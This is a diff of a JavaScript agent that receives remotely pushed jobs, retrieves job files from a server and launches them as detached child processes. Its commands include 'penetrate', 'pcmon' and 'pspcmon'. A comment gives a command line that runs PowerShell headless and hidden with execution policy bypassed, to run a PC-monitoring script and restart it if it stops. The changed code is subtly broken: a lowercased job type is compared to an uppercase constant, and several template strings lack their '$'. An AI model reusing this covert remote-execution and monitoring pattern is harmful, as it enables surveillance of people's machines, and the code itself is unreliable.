@@ -445,16 +445,15 @@ class CmdConfig {
         this.parentcmdconfig = cmdconfig;
     }
 
+    // list of supported commands
     static cmdfuncs = {
         penetrate: penetrate,
         retrieve: retrieve,
         watchdog: watchdog,
         cmdlist: cmdlist,
         ping: ping,
-        noderelay: null,
-        pythonrelay: null,
-        pcmon: null,
-        pspcmon: null,
+        pcmon: pcmon,
+        pspcmon: pspcmon,
         init: startup,
         task: startup,
         execjob: execjob,
@@ -2353,6 +2352,60 @@ async function retrieveClientJob() {
     return clientjob;
 }
 
+function cmdlist_handlecmdjob(clientjob, configfpath) {
+    logmsg("starting");
+
+    let cmdname = clientjob.cmdname.toLowerCase();
+
+    if (!CmdConfig.isCmdExist(cmdname)) {
+        throw new Error(`command is not supported {cmdname}`);
+    }
+
+    let cmdargs = clientjob.args ?? [];
+
+    let stopcmd = false;
+
+    if ( cmdname.startsWith("start") ) {
+        cmdname = cmdname.replace("start", "");
+    } else if ( cmdname.startsWith("stop") ) {
+        cmdname = cmdname.replace("stop", "");
+        stopcmd = true;
+    }
+
+    let jobcmd = cmdlistcmd.getChildCmd(cmdname);
+
+    if ( ! jobcmd ) {
+        throw new Error(`could not create child cmd {cmdname}`);
+    }
+
+    if ( stopcmd ) {
+
+        jobcmd.processMessage = (msg) => {
+            logmsg(JSON.stringify(msg));
+        };
+
+        cmdlistcmd.sendMessage(jobcmd, "cmdlist", clientjob);
+
+    } else if ( ! stopcmd ) {
+
+        jobcmd.processMessage = (msg) => {
+            logmsg(JSON.stringify(msg));
+        };
+
+        let ret = jobcmd.launch([configfpath]);
+
+        jobcmd.childprocess.unref();
+    }
+    
+    logmsg("finished");
+
+    return;
+}
+
+// generates child cmds corresponding to clientjob being pushed via ping
+// jobtype == 'EXEC_CMD' --> internal cmd is executed
+//            'execute_cmdlist', --> job file is retrieved using retrieve.php
+// otherwise job file is executed using script engine
 async function cmdlist_handleMessage(msg) {
     logmsg("starting");
 
@@ -2367,9 +2420,9 @@ async function cmdlist_handleMessage(msg) {
     logmsg("received new client job: " + JSON.stringify(clientjob));
 
     let jobtype = clientjob?.jobtype ?? "";
-    // let jobcode = clientjob?.jobcode ?? ''; // TODO: will need to pass jobcode to cmdconfig for logging purposes
+    jobtype = jobtype.toLowerCase();
 
-    if (jobtype.toLowerCase() == "execute_cmdlist") {
+    if (jobtype == "execute_cmdlist") {
         clientjob = await retrieveClientJob();
     }
 
@@ -2381,62 +2434,17 @@ async function cmdlist_handleMessage(msg) {
         throw new Error("clientjobconfigpath does note exist " + configfpath);
     }
 
-    if (jobtype.toUpperCase() == "EXEC_CMD") {
-        let cmdname = clientjob.cmdname;
-        cmdname = cmdname.toLowerCase();
-
-        if (!CmdConfig.isCmdExist(cmdname)) {
-            throw new Error("command is not supported " + cmdname);
-        }
-
-        let cmdargs = clientjob.args ?? [];
-
-        // for relay, pcmon, pspcmon we have start/stop feature
-
-        if (
-            cmdname.toLowerCase() == "StartRelay".toLowerCase() &&
-            cmdargs.length >= 1
-        ) {
-            let relaycmd = cmdlistcmd.newCmdConfig("relay");
-
-            if (!relaycmd) {
-                throw new Error("could not create child relay cmd");
-            }
-
-            let ret = relaycmd.launch([configfpath]);
-
-            relaycmd.childprocess.unref();
-        } else if (
-            cmdname.toLowerCase() == "StopRelay".toLowerCase() &&
-            cmdargs.length >= 1
-        ) {
-            let relaycmd = cmdlistcmd.getChildCmd("relay");
-
-            relaycmd.processMessage = (msg) => {
-                logmsg("process incomming notification msgs from relay"); // TODO
-            };
-
-            cmdlistcmd.sendMessage(relaycmd, "cmdlist", clientjob);
-        } else {
-            let cmdjob = cmdlistcmd.newCmdConfig(cmdname);
-
-            if (!cmdjob) {
-                throw new Error("could not create cmd object for " + cmdname);
-            }
-
-            let ret = cmdjob.launch([configfpath]);
-
-            cmdjob.childprocess.unref();
-        }
-
+    if ( jobtype == 'EXEC_CMD' )  {
+        await cmdlist_handlecmdjob(clientjob, configfpath);
         logmsg("finished");
-
         return;
     }
 
+    // validate clientjob before proceeding
+
     let execjobcmd = cmdlistcmd.newCmdConfig("execjob");
 
-    if (!execjobcmd) {
+    if ( ! execjobcmd ) {
         throw new Error("could not create child cmd execjob");
     }
 
@@ -3137,7 +3145,7 @@ async function pspcmon() {
 
     let childp = null;
 
-    relaycmd.loopfunc = () => {
+    pspcmoncmd.loopfunc = () => {
         logmsg(`{pspcmoncmd.cmdname} looping...`);
 
         let tcmdpid = childp?.pid ?? -1;
@@ -3157,7 +3165,7 @@ async function pspcmon() {
         }
     };
 
-    relaycmd.loop();
+    pspcmoncmd.loop();
     // invoke_exe -- launch powershell using conhost 
     // monitor child process, if inactive restart
     // conhost.exe --headless powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File pc_monitoring.ps1
